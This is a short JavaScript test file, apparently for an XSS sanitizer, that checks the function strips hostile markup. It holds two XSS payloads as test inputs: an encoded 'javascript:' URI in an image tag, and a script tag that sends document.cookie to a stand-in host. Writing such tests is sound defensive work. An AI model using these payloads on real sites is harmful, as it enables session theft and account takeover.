import {xss} from './xss';

describe('xss(markup:@string)', () => {
    test('XSS Using Script Via Encoded URI Schemes', () => {
        expect(xss("<img src=j&#X41vascript:alert('test2')>")).toBe('<img>');
        expect(xss("<img src='src/images/image.jpg' />")).toBe('<img src="src/images/image.jpg">');
    });
    test('XSS stealing cookies', () => {
        expect(xss('<p>Lorem ipsum <script>new Image().src="http://yourdomain.io/"+document.cookie;</script></p>')).toBe('<p>Lorem ipsum </p>');
        expect(xss('<p>Lorem ipsum</p>')).toBe('<p>Lorem ipsum</p>');
    });
});
